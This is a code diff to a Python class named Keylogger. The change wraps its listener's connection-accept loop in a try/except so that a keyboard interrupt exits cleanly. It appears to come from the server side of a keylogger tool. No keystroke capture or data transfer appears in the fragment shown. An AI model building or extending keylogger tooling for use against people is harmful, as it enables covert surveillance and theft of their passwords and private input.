@@ -192,10 +192,13 @@ class Keylogger:
         print("[+] Listener started")
 
         # When there is a connection
-        while True:
-            client_socket, _ = self.socket.accept()
-            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
-            client_thread.start()
+        try:
+            while True:
+                client_socket, _ = self.socket.accept()
+                client_thread = threading.Thread(target=self.handle, args=(client_socket,))
+                client_thread.start()
+        except KeyboardInterrupt:
+            sys.exit(0)
 
     # Start the keylogger
     def start(self):
